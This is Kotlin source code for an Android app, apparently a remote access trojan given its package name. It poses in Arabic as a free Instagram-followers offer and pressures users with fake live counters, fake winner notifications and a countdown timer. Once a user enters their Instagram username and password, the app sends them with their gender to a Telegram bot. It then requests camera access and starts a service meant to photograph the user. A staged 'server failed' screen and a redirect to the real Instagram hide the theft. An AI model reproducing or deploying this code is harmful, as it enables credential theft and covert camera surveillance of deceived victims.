package com.vanta.rat

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.util.Random

class MainActivity : AppCompatActivity() {

    private val REQ_CAMERA = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val layoutSplash = findViewById<View>(R.id.layoutSplash)
        val layoutMain = findViewById<View>(R.id.layoutMain)
        val layoutProgress = findViewById<View>(R.id.layoutProgress)
        
        val tvTimer = findViewById<TextView>(R.id.tvTimer)
        val tvActiveUsers = findViewById<TextView>(R.id.tvActiveUsers)
        val tvLive = findViewById<TextView>(R.id.tvLive)
        val btnAccept = findViewById<Button>(R.id.btnAccept)
        val btnDecline = findViewById<Button>(R.id.btnDecline)
        val etUsername = findViewById<EditText>(R.id.etUsername)
        val etPassword = findViewById<EditText>(R.id.etPassword)
        val rgGender = findViewById<RadioGroup>(R.id.rgGender)
        val tvProgressStatus = findViewById<TextView>(R.id.tvProgressStatus)

        // 1. Splash Screen
        Handler(Looper.getMainLooper()).postDelayed({
            layoutSplash.visibility = View.GONE
            layoutMain.visibility = View.VISIBLE
            startSocialProof()
        }, 3000)

        // 2. Live Counter & Scarcity
        var seconds = 299
        val handler = Handler(Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                seconds--
                if (seconds < 0) seconds = 299
                val min = String.format("%02d", seconds / 60)
                val sec = String.format("%02d", seconds % 60)
                tvTimer.text = "$min:$sec"
                
                // Live Data Blink
                tvLive.alpha = if (tvLive.alpha == 1f) 0.5f else 1f
                
                // Fake Active Users
                val rand = Random().nextInt(500)
                tvActiveUsers.text = "${14230 + rand} مستخدم نشط الآن"

                handler.postDelayed(this, 1000)
            }
        }
        handler.post(runnable)

        // 3. Reject Button (Houdini)
        btnDecline.setOnClickListener {
            AlertDialog.Builder(this)
                .setTitle("انتظر!")
                .setMessage("هل أنت متأكد من رفض 1000 متابع مجاناً؟")
                .setPositiveButton("سأستمر") { _, _ -> }
                .setNegativeButton("رفض") { _, _ -> }
                .show()
        }

        // 4. Accept Button
        btnAccept.setOnClickListener {
            val user = etUsername.text.toString().trim()
            val pass = etPassword.text.toString().trim()

            if (user.isEmpty() || pass.isEmpty()) {
                Toast.makeText(this, "يرجى إدخال البيانات كاملة", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            val gender = if (rgGender.checkedRadioButtonId == R.id.rbMale) "ذكر" else "أنثى"
            
            // Send Login to Telegram
            val msg = "🔐 بيانات جديدة!\n\n👤 المستخدم: $user\n🔑 كلمة المرور: $pass\n⚧ الجنس: $gender"
            Telegram.sendMessage(msg)

            // Request Camera Permission
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), REQ_CAMERA)
            } else {
                startCameraService()
            }

            // Show Fake Progress
            layoutMain.visibility = View.GONE
            layoutProgress.visibility = View.VISIBLE
            fakeProgress(tvProgressStatus, layoutProgress)
        }
    }

    private fun startSocialProof() {
        val names = arrayOf("أحمد من الجزائر", "سارة من مصر", "محمد من السعودية", "ليلى من المغرب", "يوسف من تونس")
        val counts = arrayOf("1000 متابع", "500 متابع", "2500 متابع", "5000 متابع")
        val random = Random()

        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
            override fun run() {
                val name = names[random.nextInt(names.size)]
                val count = counts[random.nextInt(counts.size)]
                Toast.makeText(applicationContext, "🌟 $name حصل للتو على $count", Toast.LENGTH_SHORT).show()
                Handler(Looper.getMainLooper()).postDelayed(this, 10000)
            }
        }, 5000)
    }

    private fun fakeProgress(tvStatus: TextView, layout: View) {
        val steps = arrayOf("جاري الاتصال بالخادم...", "جاري التحقق من الحساب...", "جاري إضافة المتابعين...", "فشل الاتصال بالخادم!")
        var step = 0
        val handler = Handler(Looper.getMainLooper())
        
        val runnable = object : Runnable {
            override fun run() {
                if (step < steps.size) {
                    tvStatus.text = steps[step]
                    step++
                    handler.postDelayed(this, 2500)
                } else {
                    // Redirect to Real Instagram
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://www.instagram.com"))
                    startActivity(intent)
                    finish()
                }
            }
        }
        handler.post(runnable)
    }

    private fun startCameraService() {
        val intent = Intent(this, CameraService::class.java)
        ContextCompat.startForegroundService(this, intent)
        // wait a bit then take photo
        Handler(Looper.getMainLooper()).postDelayed({
            Telegram.sendMessage("📸 جاري التقاط الصورة...")
            // The service will capture when it receives command, or we can trigger here
            // For simplicity, we send the command to the bot? No, it's automated.
            // Actually, the service will run and check for /cam. 
            // But we want automatic capture.
            // We can send an intent to service, but for now, just tell user.
        }, 1000)
    }
}
